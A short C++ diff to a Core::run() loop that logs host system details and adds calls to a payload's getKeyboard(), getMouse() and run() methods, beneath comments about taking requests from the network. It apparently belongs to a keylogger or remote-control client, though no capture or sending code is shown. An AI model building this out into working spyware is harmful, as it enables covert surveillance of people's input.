@@ -47,10 +47,12 @@ int Core::run()
     using namespace std::chrono_literals;
 
     {
-        library::SystemInfos infos = m_payload->getInfos();
+        library::SystemInfos const &infos = m_payload->getInfos();
 
         nope::log::Log(Info) << "ProcessorArchitecture: " << (int)infos.pArch << "\nArchitecture:         " << (int)infos.arch << "\nOperating System:     " << (int)infos.os << "\nPage Size:            " << infos.pageSize << "\nCPUs:                 " << infos.nbProc << "\nRAM:                  " << infos.ram << "Mb";
     }
+    m_payload->getKeyboard();
+    m_payload->getMouse();
 
     while (1)
     {
@@ -62,6 +64,7 @@ int Core::run()
 
         // Get requests from network
         // Execute needed action
+        m_payload->run();
 
         // Prevent high cpu usage
         std::this_thread::sleep_for(1ms);
